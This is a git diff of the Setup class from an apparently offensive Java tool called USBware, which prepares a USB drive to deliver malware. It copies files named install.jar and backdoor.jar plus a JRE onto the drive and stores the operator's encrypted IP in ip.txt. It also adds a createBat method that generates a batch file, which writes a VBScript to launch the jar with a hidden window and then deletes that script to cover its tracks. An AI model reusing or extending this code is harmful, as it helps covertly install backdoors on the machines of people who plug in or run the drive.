@@ -1,13 +1,14 @@
-package thatcherdev.usbware.usbware;
+package com.github.thatcherdev.usbware.usbware;
 
 import java.io.File;
+import java.io.FileNotFoundException;
 import java.io.IOException;
 import java.io.PrintWriter;
 import java.util.ArrayList;
 import java.util.Arrays;
 import javax.swing.filechooser.FileSystemView;
 import org.apache.commons.io.FileUtils;
-import thatcherdev.usbware.backend.Utils;
+import com.github.thatcherdev.usbware.backend.Utils;
 
 public class Setup {
 
@@ -45,8 +46,9 @@ public class Setup {
 			FileUtils.copyDirectory(new File(jrePath+"\\lib"), new File(drive+":\\resources\\jre\\lib"));
 		}
 		FileUtils.copyDirectory(new File("resources\\scripts"), new File(drive+":\\resources\\scripts"));
-		FileUtils.copyFile(new File("resources\\ins.exe"), new File(drive+":\\run.exe"));
-		FileUtils.copyFile(new File("resources\\run.exe"), new File(drive+":\\resources\\backdoor.exe"));
+		FileUtils.copyFile(new File("resources\\install.jar"), new File(drive+":\\install.jar"));
+		FileUtils.copyFile(new File("resources\\backdoor.jar"), new File(drive+":\\resources\\backdoor.jar"));
+		createBat(drive+":\\run.bat", "resources\\jre", "install");
 		PrintWriter out=new PrintWriter(new File(drive+":\\resources\\ip.txt"));
 		out.println(Utils.crypt(Utils.getIP(), "USBwareIP"));
 		out.flush();
@@ -66,7 +68,8 @@ public class Setup {
 			FileUtils.copyDirectory(new File(jrePath+"\\lib"), new File(drive+":\\jre\\lib"));
 		}
 		FileUtils.copyDirectory(new File("resources\\scripts"), new File(drive+":\\scripts"));
-		FileUtils.copyFile(new File("resources\\run.exe"), new File(drive+":\\run.exe"));
+		FileUtils.copyFile(new File("resources\\backdoor.jar"), new File(drive+":\\backdoor.jar"));
+		createBat(drive+":\\run.bat", "jre", "backdoor");
 		PrintWriter out=new PrintWriter(new File(drive+":\\ip.txt"));
 		out.println(Utils.crypt(Utils.getIP(), "USBwareIP"));
 		out.flush();
@@ -103,8 +106,9 @@ public class Setup {
 			FileUtils.copyDirectory(new File("jre/lib/"), new File("/media/USBware/resources/jre/lib/"));
 		}
 		FileUtils.copyDirectory(new File("resources/scripts/"), new File("/media/USBware/resources/scripts/"));
-		FileUtils.copyFile(new File("resources/ins.exe"), new File("/media/USBware/run.exe"));
-		FileUtils.copyFile(new File("resources/run.exe"), new File("/media/USBware/resources/backdoor.exe"));
+		FileUtils.copyFile(new File("resources/install.jar"), new File("/media/USBware/install.jar"));
+		FileUtils.copyFile(new File("resources/backdoor.jar"), new File("/media/USBware/resources/backdoor.jar"));
+		createBat("/media/USBware/run.bat", "resources\\jre", "install");
 		PrintWriter out=new PrintWriter(new File("/media/USBware/resources/ip.txt"));
 		out.println(Utils.crypt(Utils.getIP(), "USBwareIP"));
 		out.flush();
@@ -122,7 +126,8 @@ public class Setup {
 			FileUtils.copyDirectory(new File("jre/lib/"), new File("/media/USBware/jre/lib/"));
 		}
 		FileUtils.copyDirectory(new File("resources/scripts/"), new File("/media/USBware/scripts/"));
-		FileUtils.copyFile(new File("resources/run.exe"), new File("/media/USBware/run.exe"));
+		FileUtils.copyFile(new File("resources/backdoor.jar"), new File("/media/USBware/backdoor.jar"));
+		createBat("/media/USBware/run.bat", "jre", "backdoor");
 		PrintWriter out=new PrintWriter(new File("/media/USBware/ip.txt"));
 		out.println(Utils.crypt(Utils.getIP(), "USBwareIP"));
 		out.flush();
@@ -135,5 +140,23 @@ public class Setup {
 	public static void linuxFinish() {
 		Utils.runBashCommand("sudo umount /media/USBware");
 		Utils.runBashCommand("sudo rm -r /media/USBware");
+	}
+
+	/**
+	 * Creates a '.bat' batch file for running a jar file in a Java Runtime
+	 * Environment (if packaged with the jar).
+	 * 
+	 * @param filePath Path of '.bat' batch file to create.
+	 * @param jrePath  Path to jre if bundled.
+	 * @param jarName  Name of '.jar' file to run.
+	 * @throws FileNotFoundException
+	 */
+	public static void createBat(String filePath, String jrePath, String jarName) throws FileNotFoundException {
+		PrintWriter out=new PrintWriter(new File(filePath));
+		out.println("@echo off\r\n"+"echo Set objShell = WScript.CreateObject(\"WScript.Shell\")>%~dp0run.vbs\r\n"+"echo objShell.Run \"cmd /c if exist "+jrePath+"\\ ("+jrePath+"\\bin\\java -jar "
+			+jarName+".jar) else (java -jar "+jarName+".jar)\", ^0, True>>%~dp0run.vbs\r\n"+"%~d0 & cd %~dp0 & start run.vbs"+"\r\n"+"call:delvbs\r\n"+":delvbs\r\n"+"if exist %~dp0run.vbs (\r\n"
+			+" timeout 1 > nul\r\n"+" %~d0 & cd %~dp0 & del run.vbs\r\n"+" @exit\r\n"+") else (\r\n"+"call:delvbs\r\n"+")\r\n"+"goto:eof");
+		out.flush();
+		out.close();
 	}
 }
